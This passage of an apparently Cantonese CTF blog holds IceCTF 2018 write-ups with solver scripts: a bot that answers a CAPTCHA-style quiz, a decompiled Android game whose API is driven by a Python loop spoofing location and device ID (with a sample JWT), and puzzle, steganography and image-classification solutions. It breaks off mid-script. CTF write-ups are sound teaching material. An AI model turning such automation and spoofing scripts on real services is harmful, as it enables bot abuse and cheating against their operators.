class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt; <span class="keyword">from</span> itertools <span class="keyword">import</span> count, islice</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solveQuestion</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">"word in the following line"</span> <span class="keyword">in</span> s:</span><br><span class="line">		s = s.replace(<span class="string">"\n"</span>,<span class="string">" "</span>).replace(<span class="string">"."</span>,<span class="string">" "</span>).replace(<span class="string">"  "</span>,<span class="string">" "</span>)</span><br><span class="line">		num = int(s.split(<span class="string">" "</span>)[<span class="number">3</span>].replace(<span class="string">"th"</span>,<span class="string">""</span>).replace(<span class="string">"st"</span>,<span class="string">""</span>).replace(<span class="string">"nd"</span>,<span class="string">""</span>).replace(<span class="string">"rd"</span>,<span class="string">""</span>))</span><br><span class="line">		<span class="keyword">return</span> s.split(<span class="string">": "</span>)[<span class="number">1</span>].split(<span class="string">" "</span>)[num<span class="number">-1</span>]</span><br><span class="line">	<span class="keyword">elif</span> <span class="string">"a prime number"</span> <span class="keyword">in</span> s:</span><br><span class="line">		num = int(s.split(<span class="string">" "</span>)[<span class="number">1</span>])</span><br><span class="line">		<span class="keyword">return</span> str(gmpy2.is_prime(num)).lower()</span><br><span class="line">	<span class="keyword">elif</span> <span class="string">"What is the greatest common divisor"</span> <span class="keyword">in</span> s:</span><br><span class="line">		num1 = int(s.split(<span class="string">" "</span>)[<span class="number">7</span>])</span><br><span class="line">		num2 = int(s.split(<span class="string">" "</span>)[<span class="number">9</span>].replace(<span class="string">"?"</span>, <span class="string">""</span>))</span><br><span class="line">		<span class="keyword">return</span> gmpy2.gcd(num1, num2)</span><br><span class="line">	<span class="keyword">elif</span> <span class="string">"Which planet is closest to the sun"</span> <span class="keyword">in</span> s:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"Mercury"</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="string">"What is the capital of Germany"</span> <span class="keyword">in</span> s:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"Berlin"</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="string">"How many planets are between Earth and the Sun?"</span> <span class="keyword">in</span> s:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"2"</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="string">"How many strings does a violin have?"</span> <span class="keyword">in</span> s:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"4"</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="string">"What is the tallest mountain on Earth?"</span> <span class="keyword">in</span> s:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"Mount Everest"</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="string">"What year is it?"</span> <span class="keyword">in</span> s:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"2018"</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="string">"What color is the sky?"</span> <span class="keyword">in</span> s:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"Blue"</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="string">"Who directed the movie Jaws?"</span> <span class="keyword">in</span> s:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"Steven Spielberg"</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="string">"What is the capital of Hawaii?"</span> <span class="keyword">in</span> s:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"Honolulu"</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">print</span> s</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">content = s.get(<span class="string">"https://43xa7xhkaj0cd8c-anticaptcha.labs.icec.tf/"</span>).text</span><br><span class="line">soup = BeautifulSoup(content, <span class="string">'html.parser'</span>)</span><br><span class="line"></span><br><span class="line">td_tags = soup.find_all(<span class="string">"td"</span>)</span><br><span class="line">answer = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(td_tags), <span class="number">2</span>):</span><br><span class="line">	answer.append(str(solveQuestion(td_tags[i].string)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> s.post(<span class="string">"https://43xa7xhkaj0cd8c-anticaptcha.labs.icec.tf/"</span>, data=&#123;<span class="string">'answer'</span>:answer&#125;).text[:<span class="number">2000</span>]</span><br></pre></td></tr></table></figure></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://catpawn.github.io/2018/09/14/IceCTF2018-Anticaptcha/" data-id="cjm1zyku6000a1ww5kzqw78l4" class="article-share-link">Teilen</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-IceCTF2018-Pokeamango" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/09/14/IceCTF2018-Pokeamango/" class="article-date">
  <time datetime="2018-09-14T12:07:27.000Z" itemprop="datePublished">2018-09-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/09/14/IceCTF2018-Pokeamango/">IceCTF2018-Pokeamango</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p><a href="pokeamango.apk">pokeamango.apk</a></p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>開左個app黎睇 , 係極簡化版既 pokemonGO , d mango會係地圖到show出黎 , 禁落去就會開相機 , 禁隻mango就會捉左<br>但係要捉150隻手動真係不了</p>
<p>Decompile完之後見到 asserts/www/ , 隻app似乎 d logic係晒 web到<br>見到map.js有段係<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">var updateMap = function() &#123;</span><br><span class="line">  console.log(<span class="string">"updating map"</span>);</span><br><span class="line">  map.setCenter(currentPos);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Clear mangos</span></span><br><span class="line">  <span class="keyword">for</span> (var i = <span class="number">0</span>; i &lt; mangos.length; i++) &#123;</span><br><span class="line">    mangos[i].setMap(<span class="keyword">null</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  mangos = [];</span><br><span class="line"></span><br><span class="line">  var user = <span class="keyword">new</span> google.maps.Marker(&#123;</span><br><span class="line">    position: currentPos,</span><br><span class="line">    map: map,</span><br><span class="line">    icon: <span class="string">'img/user_marker.png'</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// You're my favorite mango</span></span><br><span class="line">  mangos.push(user);</span><br><span class="line"></span><br><span class="line">  var payload = &#123;</span><br><span class="line">    lat: currentPos.lat,</span><br><span class="line">    <span class="keyword">long</span>: currentPos.lng</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  payload[<span class="string">"uuid"</span>] = uuid</span><br><span class="line"></span><br><span class="line">  $.post(<span class="string">"http://pokeamango.vuln.icec.tf/mango/list"</span>, payload, function(results)&#123;</span><br><span class="line">    var data = results[<span class="string">"mangos"</span>];</span><br><span class="line">    <span class="keyword">for</span> (var i = <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">      var place = data[i];</span><br><span class="line"></span><br><span class="line">      var mango = <span class="keyword">new</span> google.maps.Marker(&#123;</span><br><span class="line">        position: place,</span><br><span class="line">        map: map,</span><br><span class="line">        icon: <span class="string">'img/mangie_marker.png'</span></span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      mangos.push(mango);</span><br><span class="line"></span><br><span class="line">      mango.addListener(<span class="string">'click'</span>, function(event)&#123;</span><br><span class="line">        window.name = (currentPos.lat()) + <span class="string">","</span> + (currentPos.lng()) + <span class="string">","</span> + (<span class="keyword">this</span>.getPosition().lat()) + <span class="string">","</span> + (<span class="keyword">this</span>.getPosition().lng());</span><br><span class="line">        window.location.href = <span class="string">"camera.html"</span>;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>似乎<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pokeamango.vuln.icec.tf/mango/list</span><br></pre></td></tr></table></figure></p>
<p>係用黎list d mongo出黎</p>
<p>睇埋 map.js<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">catchMango</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  var payload = &#123;</span><br><span class="line">    <span class="string">"curLat"</span>: currentPosLat,</span><br><span class="line">    <span class="string">"curLong"</span>: currentPosLng,</span><br><span class="line">    <span class="string">"mangoLat"</span>: mangoPosLat,</span><br><span class="line">    <span class="string">"mangoLong"</span>: mangoPosLng,</span><br><span class="line">    <span class="string">"uuid"</span>: device.uuid</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">    $.post(<span class="string">"http://pokeamango.vuln.icec.tf/mango/catch"</span>, payload, function(results)&#123;</span><br><span class="line"></span><br><span class="line">    window.plugins.toast.showLongBottom(results[<span class="string">"message"</span>], function(a)&#123;console.log(<span class="string">'toast success: '</span> + a)&#125;, function(b)&#123;alert(<span class="string">'toast error: '</span> + b)&#125;)</span><br><span class="line">    $(<span class="string">"#mango"</span>).removeClass(<span class="string">"bounce infinite"</span>);</span><br><span class="line">    $(<span class="string">"#mango"</span>).addClass(<span class="string">"bounceOutRight"</span>);</span><br><span class="line">    setTimeout(function()&#123; window.location.href = <span class="string">"map.html"</span>; &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>咁有齊料自動捉mango啦</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">uuid = <span class="string">"46fc1c22626b960c"</span></span><br><span class="line">currentLat = <span class="string">"22.3208988"</span></span><br><span class="line">currentLng = <span class="string">"114.1891175"</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">	c = requests.post(<span class="string">"http://pokeamango.vuln.icec.tf/mango/list"</span>, data=&#123;<span class="string">'lat'</span>:currentLat, <span class="string">'long'</span>:currentLng, <span class="string">'uuid'</span>:uuid&#125;).text</span><br><span class="line">	<span class="keyword">print</span> c</span><br><span class="line">	j = json.loads(c)</span><br><span class="line">	<span class="keyword">if</span> j[<span class="string">'mangos'</span>] != []:</span><br><span class="line">		<span class="keyword">for</span> m <span class="keyword">in</span> j[<span class="string">'mangos'</span>]:</span><br><span class="line">			lat = m[<span class="string">'lat'</span>]</span><br><span class="line">			lng = m[<span class="string">'lng'</span>]</span><br><span class="line">			<span class="keyword">print</span> requests.post(<span class="string">"http://pokeamango.vuln.icec.tf/mango/catch"</span>, data=&#123;<span class="string">'uuid'</span>:uuid, <span class="string">'curLat'</span>:currentLat, <span class="string">'curLong'</span>:currentLng, <span class="string">'mangoLat'</span>:lat, <span class="string">'mangoLong'</span>:lng&#125;).text</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"Count: "</span> + requests.post(<span class="string">"http://pokeamango.vuln.icec.tf/mango/count"</span>, data=&#123;<span class="string">'uuid'</span>:uuid&#125;).text</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	"mangos": [&#123;</span></span><br><span class="line"><span class="string">		"lat": 22.319894,</span></span><br><span class="line"><span class="string">		"lng": 114.232087</span></span><br><span class="line"><span class="string">	&#125;],</span></span><br><span class="line"><span class="string">	"token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1dWlkIjoiNDZmYzFjMjI2MjZiOTYwYyJ9._qZPGKdWiHoRa5Jq0OgLwZC-9-nwZD8VYONsCtuM_b8"</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>
<p>當捉到無野捉之後 , 轉一個個currentLat , currentLng就可以繼續行</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://catpawn.github.io/2018/09/14/IceCTF2018-Pokeamango/" data-id="cjm1zykub000h1ww5c90l97ko" class="article-share-link">Teilen</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-IceCTF2018-Ancient-Foreign-Communication" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/09/14/IceCTF2018-Ancient-Foreign-Communication/" class="article-date">
  <time datetime="2018-09-14T12:04:30.000Z" itemprop="datePublished">2018-09-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/09/14/IceCTF2018-Ancient-Foreign-Communication/">IceCTF2018-Ancient-Foreign-Communication</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E2 A8 85 5D 5D E2 8C 9E E2 8C 9E E2 8C 9F 5B E2 A8 86 5D E2 8C 9F 5D 5D 5D E2 A8 86 E2 A8 86 E2 A8 86 E2 8C 9C 5B 5B 5B E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9E E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9D E2 A8 86 E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9E E2 8C 9E E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9F E2 8C 9D E2 8C 9D E2 A8 85 E2 A8 85 E2 8C 9E E2 8C 9E E2 A8 86 5B 5D 5D 5D E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9D 5D 5D E2 8C 9F 5B 5B 5B E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9F E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9D 5D 5D 5D E2 8C 9E E2 8C 9E E2 8C 9E E2 8C 9D E2 8C 9D E2 8C 9D E2 A8 86 5D E2 8C 9E E2 8C 9E</span><br></pre></td></tr></table></figure>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>直接 UTF-8 decode 得出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">⨅]]⌞⌞⌟[⨆]⌟]]]⨆⨆⨆⌜[[[⌝⌝⌝⌞⌝⌝⌝⌝⨆⌝⌝⌝⌞⌞⌝⌝⌝⌝⌟⌝⌝⨅⨅⌞⌞⨆[]]]⌝⌝⌝⌝]]⌟[[[⌝⌝⌝⌝⌟⌝⌝⌝⌝]]]⌞⌞⌞⌝⌝⌝⨆]⌞⌞</span><br></pre></td></tr></table></figure></p>
<p>睇住個phone numpad 唔知點解諗到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">⨅]]⌞⌞⌟[⨆]⌟]]]⨆⨆⨆⌜[[[⌝⌝⌝⌞⌝⌝⌝⌝⨆⌝⌝⌝⌞⌞⌝⌝⌝⌝⌟⌝⌝⨅⨅⌞⌞⨆[]]]⌝⌝⌝⌝]] ⌟ [[[⌝⌝⌝⌝⌟⌝⌝⌝⌝]]]⌞⌞⌞⌝⌝⌝⨆]⌞⌞</span><br><span class="line">THE      mag   icwordsares                 queamish              os      sifrage    </span><br><span class="line">The magic words are squeamish ossifrage</span><br></pre></td></tr></table></figure></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://catpawn.github.io/2018/09/14/IceCTF2018-Ancient-Foreign-Communication/" data-id="cjm1zyku500091ww5bruvrj8c" class="article-share-link">Teilen</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-IceCTF2018-ilovebees" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/09/14/IceCTF2018-ilovebees/" class="article-date">
  <time datetime="2018-09-14T11:57:13.000Z" itemprop="datePublished">2018-09-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/09/14/IceCTF2018-ilovebees/">IceCTF2018-ilovebees</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p><a href="https://static.icec.tf/iloveflowers/" target="_blank" rel="noopener">https://static.icec.tf/iloveflowers/</a></p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>上網搵左搵 , 原來係抄 halo2 宣傳橋段入面果個網既<br><a href="http://www.ilovebees.co/" target="_blank" rel="noopener">http://www.ilovebees.co/</a></p>
<p>對比完2個網既source code之後發現 , 原版係冇favicon.<br>問題一定係出係favicon身上!</p>
<p>首先extract晒d frame出黎先啦 , 之後再用script拎番每幅圖既每一粒pixel既r,g,b合埋就搞掂</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageFont, ImageDraw</span><br><span class="line"></span><br><span class="line">c = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">110</span>):</span><br><span class="line">	im = Image.open(<span class="string">'frame_'</span> + str(i).zfill(<span class="number">3</span>) + <span class="string">'_delay-0.1s.gif'</span>)</span><br><span class="line">	im = im.convert(<span class="string">'RGB'</span>)</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">		<span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">			r,g,b = im.getpixel((y,x))</span><br><span class="line">			c += <span class="string">'&#123;:02x&#125;&#123;:02x&#125;&#123;:02x&#125;'</span>.format(r, g, b)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"ilovebees"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(c.decode(<span class="string">'hex'</span>))</span><br><span class="line">	f.close()</span><br></pre></td></tr></table></figure>
<p><img src="1.png" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://catpawn.github.io/2018/09/14/IceCTF2018-ilovebees/" data-id="cjm1zykuc000i1ww5xq5ggimx" class="article-share-link">Teilen</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-IceCTF2018-HotOrNot" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/09/14/IceCTF2018-HotOrNot/" class="article-date">
  <time datetime="2018-09-14T11:45:18.000Z" itemprop="datePublished">2018-09-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/09/14/IceCTF2018-HotOrNot/">IceCTF2018-HotOrNot</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p><img src="1.jpg" alt=""></p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>咁個標題都講左係要認熱狗同狗 , 咁我思路就係認晒圖入面咁多張 , 當最後個output係就白色 唔係就黑色咁先啦</p>
<p>首先切做均等大細先<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageFont, ImageDraw</span><br><span class="line"></span><br><span class="line">Image.MAX_IMAGE_PIXELS = <span class="number">379782144</span></span><br><span class="line"></span><br><span class="line">im = Image.open(<span class="string">'hotornot.jpg'</span>)</span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">87</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">87</span>):</span><br><span class="line">		chim = im.crop((<span class="number">224</span>*i, <span class="number">224</span>*j, <span class="number">224</span>*i+<span class="number">224</span>, <span class="number">224</span>*j+<span class="number">224</span>))</span><br><span class="line">		chim.save(str(index) + <span class="string">".jpg"</span>)</span><br><span class="line">		index += <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>最後出左7569張圖</p>
<p>咁之後就要做認圖果part啦 , 因為我懶 , 咁是但上網搵個library用算啦<br>最後就搵到呢個 <a href="https://github.com/jramasani/hotdog-nothotdog" target="_blank" rel="noopener">https://github.com/jramasani/hotdog-nothotdog</a></p>
<p>最後都係跟番佢<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it   --publish 6006:6006   --volume <span class="variable">$&#123;HOME&#125;</span>/tf_files:/tf_files   --workdir /tf_files   tensorflow/tensorflow:latest-devel</span><br></pre></td></tr></table></figure></p>
<p>然後改左改佢條script<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line">os.environ[<span class="string">'TF_CPP_MIN_LOG_LEVEL'</span>] = <span class="string">'2'</span></span><br><span class="line">files = os.listdir(<span class="string">"./hotornot"</span>)</span><br><span class="line">files = [file <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(<span class="string">'./hotornot'</span>) <span class="keyword">if</span> file.endswith(<span class="string">'.jpg'</span>)]</span><br><span class="line">files.sort(key= <span class="keyword">lambda</span> x:int(x[:<span class="number">-4</span>]))</span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="comment"># change this as you see fit</span></span><br><span class="line">image_path = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read in the image_data</span></span><br><span class="line">image_data = tf.gfile.FastGFile(image_path, <span class="string">'rb'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Loads label file, strips off carriage return</span></span><br><span class="line">label_lines = [line.rstrip() <span class="keyword">for</span> line</span><br><span class="line">                   <span class="keyword">in</span> tf.gfile.GFile(<span class="string">"/tf_files/retrained_labels.txt"</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Unpersists graph from file</span></span><br><span class="line"><span class="keyword">with</span> tf.gfile.FastGFile(<span class="string">"/tf_files/retrained_graph.pb"</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    graph_def = tf.GraphDef()</span><br><span class="line">    graph_def.ParseFromString(f.read())</span><br><span class="line">    tf.import_graph_def(graph_def, name=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tf.Session() <span class="keyword">as</span> sess:</span><br><span class="line">    <span class="comment"># Feed the image_data as input to the graph and get first prediction</span></span><br><span class="line">    softmax_tensor = sess.graph.get_tensor_by_name(<span class="string">'final_result:0'</span>)</span><br><span class="line"></span><br><span class="line">    predictions = sess.run(softmax_tensor, \</span><br><span class="line">             &#123;<span class="string">'DecodeJpeg/contents:0'</span>: image_data&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Sort to show labels of first prediction in order of confidence</span></span><br><span class="line">    top_k = predictions[<span class="number">0</span>].argsort()[-len(predictions[<span class="number">0</span>]):][::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    hotScore = <span class="number">0</span></span><br><span class="line">    notHotScore = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> node_id <span class="keyword">in</span> top_k:</span><br><span class="line">        human_string = label_lines[node_id]</span><br><span class="line">        score = predictions[<span class="number">0</span>][node_id]</span><br><span class="line">        <span class="comment">#print('%s (score = %.5f)' % (human_string, score))</span></span><br><span class="line">        <span class="keyword">if</span> human_string == <span class="string">"hotdog"</span>:</span><br><span class="line">            hotScore = score</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            notHotScore = score</span><br><span class="line">    <span class="keyword">if</span> hotScore &gt; notHotScore:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"1"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"0"</span></span><br></pre></td></tr></table></figure></p>
<p>自己用黎call 上面果條script既script<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call</span><br><span class="line"></span><br><span class="line">files = os.listdir(<span class="string">"./hotornot"</span>)</span><br><span class="line">files = [file <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(<span class="string">'./hotornot'</span>) <span class="keyword">if</span> file.endswith(<span class="string">'.jpg'</span>)]</span><br><span class="line">files.sort(key= <span class="keyword">lambda</span> x:int(x[:<span class="number">-4</span>]))</span><br><span class="line"><span class="keyword">print</span> files</span><br><span class="line">result = <span 